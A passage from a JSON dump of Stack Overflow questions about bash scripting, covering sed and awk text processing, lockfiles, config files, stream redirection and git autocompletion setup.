understand?</p>\n"},{"tags":["bash","sh"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":38,"score":1,"question_id":12897583,"title":"Move files from different users","body":"<p>I have a folder with some subdirs {users} e.g. \"Michael\", \"Jackson\" etc. pp. with other subdirs in each userdir: <code>cur</code>, <code>new</code> and <code>tmp</code>, these are Maildirs. </p>\n\n<p>I need a script, that can move all Files/Mail from <code>new</code> to <code>cur</code> from each user.</p>\n\n<p>How do I start to do something like this? </p>\n"},{"tags":["bash","unix","date"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12896509,"title":"Forcing \"date\" to use a locale other than the machine default","body":"<p>Is there a way to force the *nix command \"date\" to output in a specific format independent of the local? For example, if I call \"date -u\" today, on a US machine I get:</p>\n\n<pre><code>Mon Oct 15 13:15:29 UTC 2012\n</code></pre>\n\n<p>but on a German machine I get:</p>\n\n<pre><code>Mo 15. Okt 13:15:31 UTC 2012\n</code></pre>\n"},{"tags":["linux","bash","shell","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":12886703,"title":"Linux How to print all the files with the same prefix after searching for them?","body":"<p>I need to search through a directory which contains many sub directories, each which contain files. The files read as follows question1234_01, where 1234 are random digits and the suffix _01 is the number of messages that contain the prefix, meaning they are apart of the same continuing thread. </p>\n\n<pre><code>find . -name 'quest*' | cut -d_ -f1  | awk '{print $1}' | uniq -c | sort -n  \n</code></pre>\n\n<p>example output:</p>\n\n<p>1 quest1234</p>\n\n<p>10 quest1523</p>\n\n<p>This searches for all the files then sorts them in order. </p>\n\n<p>What I want to do is print all the files which end up having the most occurrences, in my example the one with 10 matches.</p>\n\n<p>So it should only output quest1523_01 - 11</p>\n"},{"tags":["bash","sed"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12891251,"title":"Bash - Substitute on a variable","body":"<p>Thank you very much in advance for helping!</p>\n\n<p>I'd like to transform this variable:</p>\n\n<p>win_path=<strong>/cygdrive/g</strong>/virtual_tours/.archives/vt_template_8_0_15/test_directory_2/panos</p>\n\n<p>into:</p>\n\n<p>win_path_dir=<strong>G:</strong>/virtual_tours/.archives/vt_template_8_0_15/test_directory_2/panos</p>\n\n<p>This in what I have so far, but it doesn't work.\nWhen I echo $win_path it returns nothing (black, empty space)</p>\n\n<pre><code>$win_path=$(echo $i | sed -e 's/\\/cygdrive\\/g/G\\:/g')\n</code></pre>\n\n<p>Cheers!</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12745020,"title":"Bash, if's, reusing variables","body":"<pre><code>if [[ $line == *\"option 1\"* ]]\nthen\n     CURRENT_OPTION=1\nfi\n\nif [[ $line == *\"option 2\"* ]]\nthen\n     CURRENT_OPTION=2\nfi\n\nif [[ $line =~ \"What i want\" ]]\nthen            \n    if [[ $CURRENT_OPTION -eq 1 ]]\n    then\n        MEM1=$(awk '/Used heap/ { gsub(/M/, \" \"); print $4 }')\n    elif [[ $CURRENT_OPTION -eq 2 ]]\n    then\n        MEM2=$(awk '/Used heap/ { gsub(/M/, \" \"); print $4 }')\n    fi\nfi\n</code></pre>\n\n<p>Because CURRENT_OPTION is defined within an if, its value is not correct when checked in the third if. How do I pass it out so that it is?</p>\n"},{"tags":["bash","unix","shell","csh","tcsh"],"answer_count":9,"favorite_count":7,"up_vote_count":25,"down_vote_count":0,"view_count":4886,"score":25,"question_id":3327013,"title":"How to determine the current shell i'm working on?","body":"<p>How to determine the current shell i am working on ? </p>\n\n<p>Does <code>ps</code> command output will alone do ?</p>\n\n<p>How to do this in different flavors of UNIX ?</p>\n"},{"tags":["perl","bash","shell","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":103,"score":0,"question_id":12885983,"title":"Grouping multiple values for same key from a text file to form single key-value pair","body":"<p>First, if there is a better title for this question, I am all ears!</p>\n\n<p>Is there a better way of doing this? </p>\n\n<p>I have a data file <code>input.txt</code> in this format:</p>\n\n<pre><code>field1=value1\nfield2=value2\nfield3=value3\n.\n.\n.\nfield1=value4\nfield2=value5\nfield3=value6\n</code></pre>\n\n<p>and so on ... and would like to end up with:</p>\n\n<pre><code>field1,value1 value4 ... valueM\nfield2,value2 value5 ... valueN\nfield3,value3 value6 ... valueO\n</code></pre>\n\n<p>What I've tried:</p>\n\n<ol>\n<li><p>Generate unique keys: <code>cat input.txt |awk -F\"=\" '{print $2}' |sort -u &gt; data_key</code></p></li>\n<li><p>Loop over rows in <code>data_key</code></p></li>\n</ol>\n\n<blockquote>\n<pre><code>#!/bin/bash\n\nfile=input.txt\nkeys=`cat data_key`\n\nfor value in $keys\ndo\n  output=`cat $file |grep $value |awk -F\"=\" '{print $2}' |tr -s '[:space:]' '[ *]' `\n  echo $value, $output\ndone\n</code></pre>\n</blockquote>\n"},{"tags":["linux","bash","unix","shell","lockfile"],"answer_count":14,"favorite_count":25,"up_vote_count":35,"down_vote_count":0,"view_count":9988,"score":35,"question_id":185451,"title":"Quick-and-dirty way to ensure only one instance of a shell script is running at a time","body":"<p>What's a quick-and-dirty way to make sure that only one instance of a shell script is running at a given time?</p>\n"},{"tags":["python","bash","shell","sequence","ls"],"answer_count":2,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":107,"score":6,"question_id":12874986,"title":"Bash alias to automatically detect arbitrarily named file sequences?","body":"<p>I'm looking to make a bash alias that will change the results of ls.  I am constantly     dealing with large sequences of files, that do not follow the same naming conventions. The     only common thing about them is that the number is 4 padded (sorry not really sure of correct way to say that) and immediately precedes the extension.</p>\n\n<p>eg - filename_v028_0392.bgeo, test_x34.prerun.0012.simdata, filename_v001_0233.exr</p>\n\n<p>I would like for the sequences to be listed each as 1 element, so that</p>\n\n<pre><code>filename_v003_0001.geo\nfilename_v003_0002.geo\nfilename_v003_0003.geo\nfilename_v003_0004.geo\nfilename_v003_0005.geo\nfilename_v003_0006.geo\nfilename_v003_0007.geo\nfilename_v003_0032.geo\nfilename_v003_0033.geo\nfilename_v003_0034.geo\nfilename_v003_0035.geo\nfilename_v003_0036.geo\ntestxxtest.0057.exr\ntestxxtest.0058.exr\ntestxxtest.0059.exr\ntestxxtest.0060.exr\ntestxxtest.0061.exr\ntestxxtest.0062.exr\ntestxxtest.0063.exr\n</code></pre>\n\n<p>would be displayed as somethign along the lines of</p>\n\n<pre><code>[seq]filename_v003_####.geo (1-7)\n[seq]filename_v003_####.geo (32-36)\n[seq]testxxtest.####.exr (57-63)\n</code></pre>\n\n<p>while still listing non sequences unaltered.</p>\n\n<p>I'm really not sure where to start approaching this.  I know a decent amount of python, but not sure if that would really be the best way to go about it.  Any help would be greatly appreciated!</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","ssh","amazon-ec2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12891039,"title":"Amazon Cloud Instance SSH prompt customization","body":"<p>Is it possible to customize ssh shell prompt to show domain name instead of ip e.g</p>\n\n<pre><code>ubuntu@ip-xx-xxx-xx-xxx:~$\n</code></pre>\n\n<p>with</p>\n\n<pre><code>ubuntu@dev.mydomain.com:~$\n</code></pre>\n"},{"tags":["linux","bash","shell","import","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":59,"score":-2,"question_id":12852582,"title":"Importing a Password from a File to a CLI command Parameter in Linux/Unix","body":"<p>I am finding it quite difficult to do the following:</p>\n\n<p>I have a script that looks like this <strong>./Something host password</strong> and what it does is simply copy files from one host to another, all it needs is for the host name and password, say:\n<strong>./Something host1 Password1</strong></p>\n\n<p>I want to run this as a daily Cronjob, but I don't want to have the password visible in the crontab when running the script or even having to hard code the Password as part of the script instead of adding it as part of a command parameter.</p>\n\n<p>So I have decided to create a file called \"Password\", that contains the password, I would then want to use this file and import the password inside it to the Password Script variable.</p>\n\n<p>The Cronjob will look like this:</p>\n\n<ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li>/bin/bash /home/yourname/yourscript.sh MyHostName </li>\n</ul></li>\n</ul></li>\n</ul></li>\n</ul></li>\n</ul>\n\n<p>as you can see I want to replace the password and instead retrieve it from a file, like:</p>\n\n<ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li>/bin/bash /home/yourname/yourscript.sh MyHostName $(PasswordFile.txt)</li>\n</ul></li>\n</ul></li>\n</ul></li>\n</ul></li>\n</ul>\n\n<p>What would be the best way to implement this?</p>\n\n<p>Note: If the question still doesnt make sense please let me know.</p>\n"},{"tags":["bash","configuration"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12776302,"title":"Bash - get variables from an external file","body":"<p>I'm trying to make a configuration file to help running a bash script.</p>\n\n<p>The idea is having a file (script.conf) like this</p>\n\n<pre><code>directory=c:/path/to/a/specific/directory/\nlogo=y\ntitle=y\nhotspots=n\ncombobox=n\n</code></pre>\n\n<p>Then, running the script, it will read script.conf and get those variables to use in the script.</p>\n\n<p>How can I do that?</p>\n"},{"tags":["bash","sed","awk","grep"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":115,"score":-2,"question_id":8847958,"title":"How to get unique rows in a file if 2 or more lines start with same word","body":"<h2>inputfile.log</h2>\n\n<pre><code>HSDA_17_VerifyShippingOrderNoInOrderConfirmationTest): Timed out after 90 seconds\nHSDA_17_VerifyShippingOrderNoInOrderConfirmationTest): Session not available\nHSDA_1_BuyVoice): Session not available \nHSDA_1_BuyVoice): Unable to locate element:\nHSDA_9_CreateAccounAndBuyDeviceInCheckoutTest): Timed out after 90 seconds\nHSDA_2_BuyMapswithNewUserAtCheckOutTest): Address already in use: connect\nHSDA_69_ChangeBillingAddressInNonUSLocaleForAllFieldsTest): Index: 0, Size: 0\n</code></pre>\n\n<h2>output expected</h2>\n\n<pre><code>HSDA_17_VerifyShippingOrderNoInOrderConfirmationTest): Timed out after 90 seconds\nHSDA_1_BuyVoice): Session not available \nHSDA_9_CreateAccounAndBuyDeviceInCheckoutTest): Timed out after 90 seconds\nHSDA_2_BuyMapswithNewUserAtCheckOutTest): Address already in use: connect\nHSDA_69_ChangeBillingAddressInNonUSLocaleForAllFieldsTest): Index: 0, Size: 0\n</code></pre>\n"},{"tags":["bash","availability","aol","checker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12888407,"title":"(Bash) $user@aol.com email availability checker","body":"<p>So, I'm trying to set up a script in bash to send a request to aim.com's signup form, where it allows you to check if an ID is able to be made like so:</p>\n\n<p><a href=\"https://new.aol.com/productsweb/?promocode=827692&amp;ncid=txtlnkuswebr00000073\" rel=\"nofollow\">https://new.aol.com/productsweb/?promocode=827692&amp;ncid=txtlnkuswebr00000073</a>\n- Choose a username</p>\n\n<p>if $user = available then $continue; else show \"Sorry, that username isn't available.\".</p>\n\n<p>Once that concept is down, I'll have it running through a list of a good 100 or so to see if any of these are able to be re-made. </p>\n\n<p>If anyone can just point me in a starting direction, that would be awesome! \nThank you for your time.</p>\n"},{"tags":["bash","if-statement","while-loop"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":80,"score":0,"question_id":12887685,"title":"bash while loop unintentionally ends after true if","body":"<p>is probably a stupid question, but can't see the reason for while abort.</p>\n\n<p>i have a file like this:</p>\n\n<pre><code>\"id\": \"00000000000000000\",\n\"visibilitystate\": 1,\n\"profilestate\": 8\n\"somethingelse\": \"abc\",\n\"id\": \"99999999999999999\",\n\"againsomethingelse\": \"cba\"\n\"visibilitystate\": 0,\n\"profilestate\": 9\n</code></pre>\n\n<p>one million or more repetitions, number,designation and value can be different between id and id, but id is always different.\nmy first thought was read in a loop, store the value in a array and later insert into mysql-db.</p>\n\n<p>i try this:</p>\n\n<pre><code>set -x\n#Data extract array\narray=(0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0)\n\n#Control array\narray2=(0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0)\n\nwhile read a; do\n    if [[ ${array2[0]} == 1 ]]; then\n        awk '/\"id\":/ { exit 42 }'\n        if [[ $? -eq 42 ]]; then\n            echo mysql\n            array2[0]=0\n        fi\n    fi\n    if [[ ${array2[0]} == 0 ]]; then\n        awk '/\"id\":/ { exit 42 }'\n        if [ $? -eq 42 ]; then\n            array[0]=`sed -n 's/.*\"id\":.\"\\(.*\\)\",.*/\\1/p'`\n            array2[0]=1\n        fi\n    fi\ndone &lt;testf\n\nset +x\n</code></pre>\n\n<p>after read one line, the loop exit, don't understand why.</p>\n\n<p>output:</p>\n\n<pre><code>+ array=(0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0)\n+ array2=(0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0)\n+ read a\n+ [[ 0 == 1 ]]\n+ [[ 0 == 0 ]]\n+ awk '/\"id\":/ { exit 42 }'\n+ '[' 42 -eq 42 ']'\n++ sed -n 's/.*\"id\":.\"\\(.*\\)\",.*/\\1/p'\n+ array[0]=\n+ array2[0]=1\n+ read a\n+ set +x\n</code></pre>\n\n<p>can someone help me?</p>\n"},{"tags":["bash","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":91,"score":1,"question_id":12882738,"title":"Get n last records and change particular columns on them","body":"<p>I have file like this</p>\n\n<pre><code>1      2      \"45554323\"      p      b  \n2      2      \"34534567\"      f      a  \n3      3      \"76546787\"      u      b  \n2      4      \"56765435\"      f      a  \n*      a  \n0      b  \n</code></pre>\n\n<p>I want delete <code>a</code>, <code>b</code> from two last Records in <code>END{}</code> section </p>\n\n<p>Result:</p>\n\n<pre><code>1      2      \"45554323\"      p      b  \n2      2      \"34534567\"      f      a  \n3      3      \"76546787\"      u      b  \n2      4      \"56765435\"      f      a  \n*        \n0        \n</code></pre>\n\n<p>How can I get n last lines and change fields on them with awk?</p>\n"},{"tags":["json","bash","twitter","sed","awk"],"answer_count":19,"favorite_count":18,"up_vote_count":30,"down_vote_count":1,"view_count":26474,"score":29,"question_id":1955505,"title":"Parsing json with sed and awk","body":"<p>I'm trying to parse json returned from a curl request, like sp:</p>\n\n<pre><code>curl 'http://twitter.com/users/username.json' | sed -e 's/[{}]/''/g' | awk -v k=\"text\" '{n=split($0,a,\",\"); for (i=1; i&lt;=n; i++) print a[i]}'\n</code></pre>\n\n<p>I have it set working where it splits the json into fields, i.e. the above returns</p>\n\n<pre><code>% ...\n\"geo_enabled\":false\n\"friends_count\":245\n\"profile_text_color\":\"000000\"\n\"status\":\"in_reply_to_screen_name\":null\n\"source\":\"web\"\n\"truncated\":false\n\"text\":\"My status\"\n\"favorited\":false\n% ...\n</code></pre>\n\n<p>But what I would like to do is grab a specific field (denoted by the -v k=text) and only print that. </p>\n\n<p>Any ideas? </p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":58,"score":1,"question_id":12887906,"title":"Exclamation mark inside quotes results in a strange parse error","body":"<p>Why does this command line work:</p>\n\n<pre><code>$ output='Irrelevant'; if [[ $output =~ Something ]]; then echo \"I found something in the output.\" ; fi\n</code></pre>\n\n<p>And this one give me a strange parse error?</p>\n\n<pre><code>$ output='Irrelevant'; if [[ $output =~ Something ]]; then echo \"I found something in the output!\" ; fi\n-bash: !\": event not found\n</code></pre>\n\n<p>The <em>only</em> change from the first version is that the sentence to be echoed inside quotes ends with an exclamation mark. <strong>Why does Bash give me that error in the second version?</strong></p>\n\n<p>In case it matters, this is the output from <code>bash --version</code>:</p>\n\n<pre><code>GNU bash, version 4.2.24(1)-release (x86_64-pc-linux-gnu)\n</code></pre>\n"},{"tags":["linux","osx","git","bash","autocomplete"],"answer_count":1,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":205,"score":4,"question_id":11571163,"title":"Git Autocompletion looks weird (and only half-functional)","body":"<p>Following <a href=\"http://railslove.com/blog/2011/11/25/git-autocomplete-in-bash-on-a-mac/\" rel=\"nofollow\">these excellent instructions for enabling Git bash autocompletion in OSX</a>:</p>\n\n<pre><code>curl https://raw.github.com/git/git/master/contrib/completion/git-completion.bash -o ~/.git-completion.bash\necho \"source ~/.git-completion.bash\" &gt;&gt; ~/.bash_profile\n</code></pre>\n\n<p>I get the following output when I type \"git <kbd>Tab</kbd><kbd>Tab</kbd>\" at the command line:</p>\n\n<p><img src=\"http://i.stack.imgur.com/pORn2.png\" alt=\"Output from git tab-tab\"></p>\n\n<p>Following multiple different tutorials produces the same result. Either I don't know the right search terms or there is just very little documented about this issue...</p>\n\n<p>Anyone encountered similar issues implementing git autocompletion for OSX? Running Lion if that's important.</p>\n"},{"tags":["c++","linux","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":69,"score":-3,"question_id":12887358,"title":"How to direct a text file to a C program using bash?","body":"<p>I am doing \"cat words | sign\" (words is the text file and sign is the c program). However this seems to generate a infinite loop. Any idea how to solve this?</p>\n\n<p>And what is the meaning of </p>\n\n<pre><code>sign &lt; words | @sort &gt; out\n</code></pre>\n\n<p>Below is the code for the c program.</p>\n\n<pre><code>int main(){\n    char words[80];\n    scanf(\"%s\", words);\n    printf(words);\n    string_sort(words);\n    printf(\" \");\n    printf(words);\n    printf(\"\\n\");\n\n    while ( words != \"\"){\n            scanf(\"%s\", words);\n            printf(\"%s\", words);\n            string_sort(words);\n            printf(\"%s\", \" \");\n            printf(\"%s\", words);\n            printf(\"\\n\");\n    }\n }\n</code></pre>\n"},{"tags":["bash","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12886883,"title":"#BASH - How can I: read input; var = grep $input; if $input = $var then","body":"<p>I want to compare what the user enters to this text file, to determine if what they entered is in the text file or not, and then tell them.</p>\n\n<p>file1: color_readme.txt\nin this file is:</p>\n\n<pre><code>red\nred\norange\nblue\n</code></pre>\n\n<p>code:</p>\n\n<pre><code>echo Please enter a color:\ncat color_readme.txt (printing the colors to screen)\nread userinput (read what the user enters)\nvariable1 = grep $userinput (a random variable = what is found in the file according to what the user typed)\nif userinput = variable1 (SAY THIS)\nelse (SAY THIS)\n</code></pre>\n\n<p>What is the best way to do this for a beginner?\nMy teacher only wants me using the basic if ifelse and else conditions.</p>\n"},{"tags":["bash","shell","unix","zsh","tee"],"answer_count":2,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":108,"score":5,"question_id":12517519,"title":"How to redirect stdout+stderr to one file while keeping streams separate?","body":"<p>Redirecting stdout+stderr such that both get written to a file while still outputting to stdout is simple enough:</p>\n\n<pre><code>cmd 2&gt;&amp;1 | tee output_file\n</code></pre>\n\n<p>But then now both stdout/stderr from cmd are coming on stdout. I'd like to write stdout+stderr to the same file (so ordering is preserved assuming cmd is single threaded) but then still be able to also separately redirect them, something like this:</p>\n\n<pre><code>some_magic_tee_variant combined_output cmd &gt; &gt;(command-expecting-stdout) 2&gt; &gt;(command-expecting-stderr)\n</code></pre>\n\n<p>So combined_output contains the both with order preserved, but the command-expecting-stdout only gets stdout and command-expecting-stderr only gets stderr. Basically, I want to log stdout+stderr while still allowing stdout and stderr to be separately redirected and piped. The problem with the tee approach is it globs them together. Is there a way to do this in bash/zsh?</p>\n"},{"tags":["c++","bash","environment-variables"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":127,"score":3,"question_id":12886018,"title":"Permanently setting environment variables from a C++ program after exit","body":"<p>I am writing a bash script that runs a C++ program multiple times. I use <code>getenv()</code> and <code>putenv()</code> to create, get, and update environment variables in the C++ program.  After the C++ program ends, the bash script needs to grab these variables and perform some basic logic.  The problem is that when the C++ program exits, the environment variables disappear.  Is there any way to permanently store these variables after the program's termination so that the bash script can use them?  If not, what is the best way to share variables between a bash script and a C++ program?  The only solution I can think of is writing output to files.  I do not want to print this data in the console.  Any help would be greatly appreciated.</p>\n"},{"tags":["osx","git","bash","command-line"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12886086,"title":"Git commits via command-line fail, showing > symbol","body":"<p>I'm new to bash. After I've staged files to my local git repository and typed in the commands to commit:</p>\n\n<pre><code>    git commit -m \"Descriptive message\"\n</code></pre>\n\n<p>Git (or is it terminal?) stops dead, showing the</p>\n\n<pre><code>    &gt;\n</code></pre>\n\n<p>symbol. It won't accept further commands and I have to exit the session and start a new one. Why does this happen?</p>\n"},{"tags":["bash","script","command","find"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":12885694,"title":"search with find command until first match","body":"<p>I just need to search for a specific directory that can be anywhere is there a way to run this command until the first match? Thanx!\nIm now ussing </p>\n\n<pre><code>find / -noleaf -name 'experiment' -type d | wc -l\n</code></pre>\n"},{"tags":["linux","bash","makefile"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12884845,"title":"makefile not generating executeble files","body":"<p>I am fairly new at makefile. I am trying to create a makefile that compiles yu.c and link yu.c to get a executable file called yu.<br>\nBelow is the code i have. I am using make -f mymakefile to run the file and each time i run it, only gcc -c yuFile.c is done.\nWhere am I wrong?</p>\n\n<pre><code>CC=gcc\n\nyu.o: yuFile.c\n    ${CC} -c yuFile.c\nyu: yuFile.o\n    ${CC} yu -o yuFile.o\nrun-c: yu\n    ./yu\nclean:\n    rm -f \"*.o\" core\n</code></pre>\n"},{"tags":["bash","solaris","opensolaris"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12884540,"title":"Bash - iterate over a union of two (disjoint) arrays","body":"<p>I am writing a bash script (for an Open Solaris 11 machine).</p>\n\n<p>I have declared two arrays in the following way:</p>\n\n<pre><code>rpool_fs=(\n  \"rpool\"\n  \"rpool/ROOT\"\n  \"rpool/ROOT/solaris\"\n  \"rpool/export\"\n);\n\nshares_fs=(\n  \"shares\"\n  \"shares/svn\"\n);\n</code></pre>\n\n<p>I am able to iterate over the rpool_fs array in the following way:</p>\n\n<pre><code>for i in \"${rpool_fs[@]}\"\ndo\n  echo $i\ndone\n</code></pre>\n\n<p><strong>I would now need to iterate over the union of the rpool_fs and shares_fs arrays.</strong> Note that the arrays are disjoint, e.g. I do in fact only need to iterate over a concatention of them. How do I do that?</p>\n"},{"tags":["linux","bash","unix","newline"],"answer_count":7,"favorite_count":1,"up_vote_count":12,"down_vote_count":0,"view_count":10834,"score":12,"question_id":2613800,"title":"How to convert DOS/Windows newline to Unix newline in bash script?","body":"<p>In bash, how do I convert DOW/Windows newlines to Unix? It must be non-interactive, not like starting <code>vi</code> and typing something in, but a command on the command line that can be put in a script file. The <code>dos2unix</code> and <code>unix2dos</code> commands are not available on the system.</p>\n\n<p>How do I do this with commands like <code>sed</code>/<code>awk</code>/<code>tr</code>?</p>\n"},{"tags":["string","bash","file-download"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":42,"score":-1,"question_id":12882077,"title":"podcast automatic download, need string tokenizer","body":"<p>I'm creating this script, it's goal is to download some pod-cast episodes.\nI copied the rtsp link for each episode into VAR.\nI need to extract the first line from VAR into a place-holder called TMP.<br>\nUsing mplayer I will download the stream in TMP as 01.ra, 02.ra etc...<br>\nI'm having some trouble with the syntax. The script below is what I managed to do so far . Can someone suggest what missing information I need to add or advise me on where to look?</p>\n\n<pre><code>#!/bin/sh\nVAR=\"\nrtsp://mm6.rai.it/radiofonia/radio3/napoli/terzo_anello/2011/doppiosogno2011_11_21.ra\nrtsp://mm6.rai.it/radiofonia/radio3/napoli/terzo_anello/2011/doppiosogno2011_11_22.ra\nrtsp://mm6.rai.it/radiofonia/radio3/napoli/terzo_anello/2011/doppiosogno2011_11_23.ra\nrtsp://mm6.rai.it/radiofonia/radio3/napoli/terzo_anello/2011/doppiosogno2011_11_24.ra\"\n\nX=1\n\nwhile [${VAR} != \"\"] \n</code></pre>\n\n<p>Is this syntax correct?<br>\nMy condition should be: as long as VAR is not empty string</p>\n\n<pre><code>do\nTMP=\"first line of VAR\" \n#i.e.  \"rtsp://mm6.rai.it/radiofonia/radio3/napoli/terzo_anello/2011/doppiosogno2011_11_21.ra\"\n\nmplayer -noframedrop -dumpstream -dumpfile ${X}.ra ${TMP}\n#this will download the stream in TMP as file X.ra\n\n#remove TMP from VAR, VAR should now miss its first line\n\nX=`expr $X + 1` #X++\ndone\n</code></pre>\n"},{"tags":["eclipse","bash","shell","batch-file","pydev"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12881333,"title":"Bash-->Batch + Colon and back/forward-slash use","body":"<p>I'm trying to make portable pyDev automatically set up the python interpreter by using a batch script that's run before eclipse launches. I came across the following bash-script for doing just that, but I'm unable to translate it to batch (which I'm familiar with):   </p>\n\n<pre><code>PYTHONPATH=/my/extra/python/modules python /my/eclipse/plugins/org.python.pydev_*/PySrc/interpreterInfo.py 2&gt;/dev/null | sed 's/INS_PATH$//g;s/OUT_PATH$//g;s/^EXECUTABLE:/Executable\\\\:/g' | tr -d '\\n' | cat &lt;(echo -en 'eclipse.preferences.version=1\\nINTERPRETER_PATH_NEW=Name\\:python\\:EndName\\:') - &lt;(echo '&amp;&amp;&amp;&amp;&amp;') &gt;/my/workspace/.metadata/.plugins/org.eclipse.core.runtime/.settings/org.python.pydev.prefs\n</code></pre>\n\n<p><strong>I tried breaking it down to see what's being replaced/piped where, but it doesn't make sense:</strong></p>\n\n<pre><code>PYTHONPATH= App/Eclipse/plugins/org.python.pydev_*/PySrc/interpreterInfo.py 2&gt; /dev/null \n|sed '  s/ INS_PATH$/ / g; REM Delete all instances of INS_PATH that are at the end of a line\n        s/ OUT_PATH$/ / g; REM Delete all instances of OUT_PATH that are at the end of a line\n        s/ ^EXECUTABLE:/ Executable\\\\:/ g REM Replace all instances of \"\\nEXECUTABLE:\" that are at the beginning of a line with \"Executable\\:\"\n' \n|tr -d '\\n' \n|cat &lt;(echo -en 'eclipse.preferences.version= 1 \\n INTERPRETER_PATH_NEW= Name\\:python\\:EndName\\:') - &lt;(echo '&amp;&amp;&amp;&amp;&amp;') \n&gt;/my/workspace/.metadata/.plugins/org.eclipse.core.runtime/.settings/org.python.pydev.prefs\n</code></pre>\n\n<hr>\n\n<p>One of the most confusing parts is the the strange use of colons and use of <strong>'/'</strong> vs <strong>'\\'</strong>. \nLooking in config files I see <code>osgi.framework=file\\:plugins/org.eclipse.osgi_3.8.0.v20120529-1548.jar</code></p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12882089,"title":"BASH - Variable name from variable","body":"<p>my code</p>\n\n<pre><code>TOTAL=${#FOO_5[*]} // COUNT ITEMS IN ARRAY\n</code></pre>\n\n<p>what if code</p>\n\n<pre><code>ARRAY_NAME=\"FOO_5\"\nTOTAL=${#${!ARRAY_NAME}[*]} //error\n</code></pre>\n\n<p>please fix\nthank you very much</p>\n"},{"tags":["c","bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":108,"score":-1,"question_id":12874968,"title":"Pass parameter from shell script to c program","body":"<pre><code>gcc (GCC) 4.7.2\nGNU bash, version 4.2.37\n</code></pre>\n\n<p>Hello,</p>\n\n<p>I have the following bash script that I want to pass string parameter to my c program. I tried using pipes but failed.</p>\n\n<p>The c program will need to get an input from the shell script. I am not sure to to read in an input from a shell script.</p>\n\n<p>My bash script is below.</p>\n\n<pre><code>#!/usr/bash\n\n# About on any errors\nset -e\n\nRUN_WITH_VALGRIND=\"\"\n\nif [ \"$1\" == \"valgrind\" ]; then\n    RUN_WITH_VALGRIND=\"valgrind\"\n    echo \"START TESTING WITH VALGRIND\"\nfi\n\n$RUN_WITH_VALGRIND ./c_program\n\necho \"Hello\" | ./c_program\n</code></pre>\n\n<p>And my sample c program is here:</p>\n\n<pre><code>char str_input[16];\nprintf(\"Get input: \");\nscanf(\"%s\", str_input);\nprintf(\"Input [ %s ]\\n\", str_input);\n</code></pre>\n\n<p>I am trying to get the scanf to read the input from the shell script.</p>\n\n<p>Many thanks for any advice,</p>\n"},{"tags":["git","bash","terminal","sh"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12872446,"title":"git with --git-dir= results in 'not a git repository'","body":"<p>I have a script in one of my iOS apps that should get the git revision hash and put it in the version number. In this script I run git --git-dir=\"$PROJECT_DIR\" show -s --pretty=format:%h for that. However, I get the message that the directory isn't a git repository. If I echo the PROJECT_DIR var and go to the terminal the following works:</p>\n\n<pre><code>cd projectDirPath\ngit show -s --pretty=format:%h\n</code></pre>\n\n<p>What doesn't work is:</p>\n\n<pre><code>git --git-dir=projectDirPath show -s --pretty=format:%h\n</code></pre>\n\n<p>Am I missing something? The documentation states, that I can specify the path to a git repository with --git-dir and the specified path obviously is a git repository as all the git commands work without any problem if I first cd into that path. However if I am not in this path, specifing --git-dir doesn't work.</p>\n\n<p>Best regards,\nMichael</p>\n"},{"tags":["python","ruby","perl","bash","shell"],"answer_count":12,"favorite_count":80,"up_vote_count":181,"down_vote_count":2,"view_count":45618,"score":179,"question_id":3637668,"title":"Why are scripting languages (e.g. Perl, Python, Ruby) not suitable as shell 